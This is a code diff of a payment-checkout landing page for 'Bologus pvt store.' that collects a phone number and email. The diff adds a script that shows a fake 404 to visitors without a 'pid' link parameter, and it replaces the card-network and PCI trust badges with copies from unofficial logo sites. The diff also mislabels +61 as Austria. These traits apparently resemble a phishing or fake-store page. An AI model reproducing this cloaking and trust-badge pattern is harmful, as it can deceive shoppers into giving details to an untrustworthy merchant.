@@ -3,8 +3,10 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Landing Page</title>
+  <title>Bologus pvt store.</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
   <style>
+    /* Existing Styles */
     body {
       background-color: white;
       min-height: 100vh;
@@ -29,9 +31,9 @@
     }
     .container {
       background: white;
-      border-radius: 12px;
-      padding: 24px;
-      width: 400px;
+      border-radius: 8px;
+      padding: 20px;
+      width: 350px;
       max-width: 90%;
       box-shadow: 0 8px 32px rgba(0,0,0,0.1);
       position: relative;
@@ -152,16 +154,77 @@
     .footer-logos img {
       max-height: 40px;
     }
+    /* Mobile-specific adjustments */
+    @media (max-width: 600px) {
+      .footer-logos {
+        position: fixed;
+        bottom: 30px;
+        left: 50%;
+        transform: translateX(-50%);
+        gap: 10px;
+        background-color: white;
+        padding: 5px 0;
+        width: 100%;
+        justify-content: center;
+        z-index: 100;
+      }
+      .footer-logos img {
+        max-height: 25px;
+      }
+      .container {
+        margin-bottom: 90px;
+      }
+    }
+    /* 404 Error Page Styles */
+    .error-page {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: #f8f8f8;
+    }
+    .error-page h1 {
+      font-size: 5rem;
+      color: #333;
+      margin: 0;
+    }
+    .error-page p {
+      font-size: 1.5rem;
+      color: #666;
+    }
   </style>
+  <script>
+    (function(){
+      // Get current path and search string
+      var pathname = window.location.pathname;
+      var search = window.location.search;
+      
+      // If the URL is exactly "landing.html" without a valid pid, show 404.
+      if (pathname.indexOf("landing.html") !== -1 && !search.includes("pid=")) {
+        document.addEventListener("DOMContentLoaded", function(){
+          document.body.innerHTML = '<div class="error-page"><h1>404</h1><p>Page not found</p></div>';
+        });
+      }
+      // Else if there is a valid pid in the query string, treat as a valid payment link.
+      else if (search.includes("pid=")) {
+        var urlParams = new URLSearchParams(search);
+        var pid = urlParams.get("pid");
+        if(pid && pid !== "null") {
+          sessionStorage.setItem("pid", pid);
+        }
+      }
+    })();
+  </script>
 </head>
 <body>
   <div class="container">
     <div class="header">
-      <div class="merchant-name">GEEKAY</div>
-      <img src="https://images.unsplash.com/photo-1572059002053-8cc5ad2f4a38?w=80&h=80&fit=crop" alt="Logo" class="logo" />
+      <div class="merchant-name">Bologus pvt store.</div>
+      <img src="https://assets.turbologo.com/assets/features/professional-logo-templates-d9cc9a0d95eef758e45d197ff85b696204a467ac5b66fbf0a08a44be16ffe382.svg" alt="Logo" class="logo" />
     </div>
-    <span class="contact-label">Contact details</span>
-    <p class="instruction-text">Enter mobile number and email (optional) to continue</p>
+    <span class="contact-label">Contact</span>
+    <p class="instruction-text">Enter your contact details here</p>
     <div class="input-container">
       <div class="mobile-input">
         <div class="country-code">
@@ -171,6 +234,16 @@
             <option value="+44">+44 UK</option>
             <option value="+65">+65 Singapore</option>
             <option value="+971">+971 UAE</option>
+            <option value="+61">+61 Austria</option>
+            <option value="+43">+43 Austria</option>
+            <option value="+1-242">+1-242 Bahamas</option>
+            <option value="+1">+1 Canada</option>
+            <option value="+86">+86 China</option>
+            <option value="+57">+57 Colombia</option>
+            <option value="+1">+1 USA</option>
+            <option value="+880">+880 Bangladesh</option>
+            <option value="+55">+55 Brazil</option>
+            <option value="+506">+506 Costa Rica</option>
           </select>
         </div>
         <input type="tel" placeholder="Mobile number" pattern="[0-9]{10}" id="phoneInput" />
@@ -186,10 +259,10 @@
     </button>
   </div>
   <div class="footer-logos">
-    <img src="https://www.pcisecuritystandards.org/wp-content/uploads/2022/03/pci-logo-teal.svg" alt="PCI DSS Logo" />
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/ba/Razorpay_logo.svg/2560px-Razorpay_logo.svg.png" alt="Razorpay" />
-    <img src="https://www.mastercard.us/content/dam/public/mastercardcom/na/us/en/homepage/Home/mc-logo-52.svg" alt="MasterCard" />
-    <img src="https://usa.visa.com/dam/VCOM/regional/ve/romania/blogs/hero-image/visa-logo-800x450.jpg" alt="Visa" />
+    <img src="https://maceinnovations.com/wp-content/uploads/2019/04/pci-dss-logo.png" alt="PCI DSS Compliance" />
+    <img src="https://latestlogo.com/wp-content/uploads/2024/01/razorpay-logo.svg" alt="Razorpay" />
+    <img src="https://logowik.com/content/uploads/images/t_mastercard-line7171.logowik.com.webp" alt="MasterCard Securecode" />
+    <img src="https://iconape.com/wp-content/png_logo_vector/visa-verified-by-logo-2.png" alt="Verified by Visa" />
   </div>
   <script>
     document.getElementById('proceedBtn').addEventListener('click', function() {
@@ -211,9 +284,13 @@
       localStorage.setItem('userEmail', emailInput.value.trim());
       const urlParams = new URLSearchParams(window.location.search);
       const pid = urlParams.get('pid');
-      setTimeout(function(){
-        window.location.href = `/payment.html?pid=${pid}`;
-      }, 2000);
+      if (pid) {
+        setTimeout(function(){
+          window.location.href = `/payment.html?pid=${pid}`;
+        }, 2000);
+      } else {
+        console.error('PID is missing in the URL');
+      }
     });
   </script>
 </body>
